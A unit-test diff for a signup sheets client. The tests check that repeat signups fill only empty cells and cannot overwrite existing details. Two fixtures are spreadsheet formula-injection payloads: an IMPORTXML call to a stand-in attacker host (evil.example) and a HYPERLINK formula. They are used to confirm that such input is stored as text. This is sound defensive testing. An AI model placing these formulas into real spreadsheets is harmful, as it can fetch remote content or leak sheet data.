@@ -178,7 +178,7 @@ describe("unit: sheets client", () => {
     expect(h.calls.getCellsInRange).toEqual(["A2:A"])
   })
   for (const email of ["a@b.com", "  A@B.COM "]) {
-    test(`updates timestamp and country cells for ${JSON.stringify(email)}`, async () => {
+    test(`moves only last_seen_at on a row that holds a country, for ${JSON.stringify(email)}`, async () => {
       const original = {
         email,
         first_seen_at: "original",
@@ -193,18 +193,54 @@ describe("unit: sheets client", () => {
         headerCreated: false,
         columnsAdded: [],
       })
-      expect(h.rows).toEqual([{ ...original, last_seen_at: at, ...country }])
+      expect(h.rows).toEqual([{ ...original, last_seen_at: at }])
       expect(h.calls.loadCells).toEqual([["C2", "D2", "E2"]])
-      expect(h.calls.saveUpdatedCells).toEqual([
-        [
-          { address: "C2", value: at },
-          { address: "D2", value: "GB" },
-          { address: "E2", value: "United Kingdom" },
-        ],
-      ])
+      expect(h.calls.saveUpdatedCells).toEqual([[{ address: "C2", value: at }]])
       expect(h.calls.addRow).toEqual([])
     })
   }
+  test("fills a country that is empty and keeps one that is not", async () => {
+    const h = harness({
+      headers: [...COLUMNS],
+      rows: [{ email: "a@b.com", country_code: "FR", country_name: "" }],
+    })
+    await h.client.upsert(input("a@b.com"))
+    expect(h.rows[0]).toMatchObject({
+      last_seen_at: at,
+      country_code: "FR",
+      country_name: "United Kingdom",
+    })
+  })
+  test("keeps every cell that holds a value, however a visitor fills the form in", async () => {
+    const row = {
+      email: "a@b.com",
+      first_seen_at: "original",
+      last_seen_at: "old",
+      country_code: "FR",
+      country_name: "France",
+      contacted: "TRUE",
+      business_name: "Real Ltd",
+      business_headcount: "1–10",
+      full_name: "Real Person",
+    }
+    const h = harness({ headers: [...COLUMNS], rows: [row] })
+    await h.client.upsert({
+      ...input("a@b.com"),
+      businessName: "Attacker Ltd",
+      businessHeadcount: "1000+",
+      fullName: "Attacker Chosen Name",
+    })
+    expect(h.rows).toEqual([{ ...row, last_seen_at: at }])
+    expect(h.calls.saveUpdatedCells).toEqual([[{ address: "C2", value: at }]])
+  })
+  test("treats a cell of blanks as empty", async () => {
+    const h = harness({
+      headers: [...COLUMNS],
+      rows: [{ email: "a@b.com", full_name: "  " }],
+    })
+    await h.client.upsert({ ...input("a@b.com"), fullName: "Ada Lovelace" })
+    expect(h.rows[0].full_name).toBe("Ada Lovelace")
+  })
   test("looks an address up in the email column alone, wherever that column is", async () => {
     const headers = [
       "note",
@@ -425,7 +461,7 @@ describe("unit: sheets client", () => {
     expect(h.calls.addRow[0].options).toEqual({ raw: true })
     expect(h.rows[0].business_name).toBe(businessName)
   })
-  test("writes a repeat signup's business details through stringValue, so a formula stays text", async () => {
+  test("fills a repeat signup's empty business details through stringValue, so a formula stays text", async () => {
     const h = harness()
     const businessName = '=IMPORTXML("https://evil.example","//a")'
     await h.client.upsert(input("a@b.com"))
@@ -445,15 +481,13 @@ describe("unit: sheets client", () => {
     expect(h.rows[0].full_name).toBe(fullName)
     expect(h.rows[0].business_name).toBe("")
   })
-  test("writes a repeat signup's full name through stringValue, so a formula stays text", async () => {
+  test("fills a repeat signup's empty full name through stringValue, so a formula stays text", async () => {
     const h = harness()
     const fullName = "=HYPERLINK(1)"
     await h.client.upsert(input("a@b.com"))
     await h.client.upsert({ ...input("a@b.com"), fullName })
     expect(h.calls.saveUpdatedCells[0].map(({ address }) => address)).toEqual([
       "C2",
-      "D2",
-      "E2",
       "I2",
     ])
     expect(h.calls.saveUpdatedCells[0]).toContainEqual({
@@ -466,11 +500,7 @@ describe("unit: sheets client", () => {
     const h = harness()
     await h.client.upsert({ ...input("a@b.com"), ...business, ...person })
     await h.client.upsert(input("a@b.com"))
-    expect(h.calls.saveUpdatedCells[0].map(({ address }) => address)).toEqual([
-      "C2",
-      "D2",
-      "E2",
-    ])
+    expect(h.calls.loadCells[0]).toEqual(["C2", "D2", "E2"])
     expect(h.rows[0].business_name).toBe("Acme")
     expect(h.rows[0].business_headcount).toBe("11–50")
     expect(h.rows[0].full_name).toBe("Ada Lovelace")
